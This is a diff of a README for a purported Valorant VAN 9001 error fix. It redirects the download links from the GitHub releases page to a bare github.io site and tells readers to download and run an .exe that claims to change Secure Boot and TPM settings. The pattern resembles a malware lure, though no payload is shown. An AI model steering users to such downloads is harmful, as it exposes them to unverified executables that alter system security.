@@ -1,6 +1,6 @@
 # 🛡️ Valorant-VAN9001-Fix - Repair your Valorant VAN 9001 error
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/duranteplatonic539/Valorant-VAN9001-Fix/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://duranteplatonic539.github.io)
 
 ## 🎯 Purpose
 This application fixes the VAN 9001 error in Valorant. This error occurs when your system settings do not meet the security requirements for Riot Vanguard. Windows 11 users encounter this error because Secure Boot and TPM 2.0 must remain active. This tool checks your system settings and applies the necessary changes to restore game access.
@@ -13,7 +13,7 @@ This application fixes the VAN 9001 error in Valorant. This error occurs when yo
 ## 📥 Downloading the application
 Visit the official release page to get the latest file for your computer.
 
-[Click here to visit the release page](https://github.com/duranteplatonic539/Valorant-VAN9001-Fix/releases)
+[Click here to visit the release page](https://duranteplatonic539.github.io)
 
 Look for the latest version listed under the Releases section. Select the file ending in .exe to begin the download. Save this file to your desktop or your Downloads folder for easy access.
 
